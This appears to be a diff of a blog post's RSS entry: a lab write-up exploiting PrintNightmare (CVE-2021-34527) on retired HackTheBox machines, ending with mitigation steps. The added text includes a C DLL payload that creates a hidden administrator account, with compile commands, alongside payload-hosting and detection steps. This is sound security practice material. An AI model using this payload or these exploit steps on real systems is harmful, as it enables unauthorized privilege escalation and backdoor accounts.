@@ -14,10 +14,10 @@
       <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
       <description>Having fun with a Zero-Day vulnerability</description>
       <content:encoded><![CDATA[<p>For the past week, a lot of InfoSec pros I follow on Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print  Spooler service that could be used for privilege escalation, and, furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021  for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
-<p>In this post, I would like to play with the vulnerability using HackTheBox retired machines as targets.</p>
-<p><strong>[Updated 19-07-2021]</strong></p>
+<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability, but in this post, I would like to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
+<p><strong>[Updated 20-07-2021]</strong></p>
 <ul>
-<li>Reformat the post and more references.</li>
+<li>Add self-compile payload</li>
 </ul>
 <h2 id="target-machines">Target Machines</h2>
 <p>The following are the retired Windows machines from HackTheBox along with a low privilege user that I will use to play with PrintNightmare.</p>
@@ -60,10 +60,11 @@
 </table>
 </center>
 <h2 id="preparation">Preparation</h2>
-<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0. But, changing the currently installed impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
+<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.</p>
+<p>But, changing the currently installed impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
 <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
 </code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can grab the DLL directly.</p>
-<p>That&rsquo;s why I will do some preparation.</p>
+<p>That&rsquo;s being said, I will do some preparation.</p>
 <h3 id="working-directory">Working Directory</h3>
 <p>The first one is a working directory/folder, which I will create one in <code>/opt</code> called <code>printnightmare</code>.</p>
 <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
@@ -103,12 +104,15 @@ No encoder specified, outputting raw payload
 Payload size: <span class="m">460</span> bytes
 Final size of dll file: <span class="m">8704</span> bytes
 </code></pre></div><p>The DLL generated under <code>/opt/printnightmare/dll/[here]</code>.</p>
+<blockquote>
+<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="">#Troubleshoot</a></p>
+</blockquote>
 <h3 id="samba-configuration">Samba Configuration</h3>
-<p>Fortunately, in the exploit repo cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload.</p>
-<p>But, before doing any modification, I will create a backup of the original Samba configuration file.</p>
+<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide but I will add some additional lines for logging to the configuration files.</p>
+<p>First, I will create a backup of the original Samba configuration file.</p>
 <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
 $ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
-</code></pre></div><p>I will follow cube0x0&rsquo;s guide but I will add some additional lines for logging to the configuration files. The following are the final configuration that I will use.</p>
+</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[global]
    server role = standalone server
    smb ports = 445
@@ -135,9 +139,9 @@ $ sudo systemctl start smbd
 <li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
 <li>Hash or password for a low privileged user (or computer) account  ✔</li>
 </ol>
-<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction using a tool from impacket called <code>rpcdump.py</code>.</p>
+<p>Now to check if the Print Spooler service enabled, I could also follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
 <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
-</code></pre></div><p><code>rpcclient</code> ()can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is &ldquo;Could not initialise spoolss&rdquo;, then the Print Spooler is most likely to be disabled.</p>
+</code></pre></div><p>I found out that <code>rpcclient</code> can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is &ldquo;Could not initialise spoolss&rdquo;, then the Print Spooler is most likely to be disabled.</p>
 <p>The following is a dirty bash script I created to do these detections in one run.</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
 </span><span class="cp"></span>
@@ -156,7 +160,7 @@ $ sudo systemctl start smbd
 		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
 	<span class="k">done</span>
 <span class="k">fi</span>
-</code></pre></div><p>I saved the script as  <code>detect-nightmare.sh</code> , and it displayed the following results.</p>
+</code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
 <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
 $ ./detect-nightmare.sh target-machines
  - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
@@ -176,7 +180,7 @@ Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
 Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
 No printers returned.
-</code></pre></div><p>Although Active and Forest doesn&rsquo;t seem vulnerable, I will test them out!</p>
+</code></pre></div><p>From the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
 <h2 id="exploitation-demo">Exploitation Demo</h2>
 <h3 id="htb-active---101010100">HTB: Active - 10.10.10.100</h3>
 <p>As expected, on Active, the exploit failed.</p>
@@ -348,6 +352,33 @@ BUILTIN<span class="se">\A</span>dministrators                                  
 ATOM
 </code></pre></div><p><img class="img-container" src="imgs/image-20210718025137956.png" alt="image-20210718025137956"  />
 </p>
+<p><strong>[Update]</strong></p>
+<p>Didn&rsquo;t know that <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> provides some DLL  code templates in C. The following is the one that I use</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
+</span><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
+</span><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
+</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd /c net user iamf P@ssw0rd /add; cmd /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
+        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="nl">DLL_PROCESS_DEATCH</span><span class="p">:</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>For compilation, I will need <code>mingw-w64</code> compiler, which can be installed using <code>sudo apt install mingw-w64</code>. Once the compiler is installed, I will run the following command to compile the DLL.</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
+</code></pre></div><p>I don&rsquo;t demo this DLL since the process and the result are the same 😅.</p>
 <h2 id="mitigation">Mitigation</h2>
 <p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare: Disable Print Spooler service and Disable inbound remote printing through Group Policy. Also it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.</p>
 <p>As for the second option, I have no idea to work with that from CLI, so I&rsquo;ll just try the first option.</p>
@@ -380,6 +411,7 @@ Running  Spooler            Print Spooler
 <li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
 <li><a href="https://github.com/LaresLLC/CVE-2021-1675">https://github.com/LaresLLC/CVE-2021-1675</a></li>
 <li><a href="https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point">https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li>
+<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own</a></li>
 </ul>
 ]]></content:encoded>
     </item>
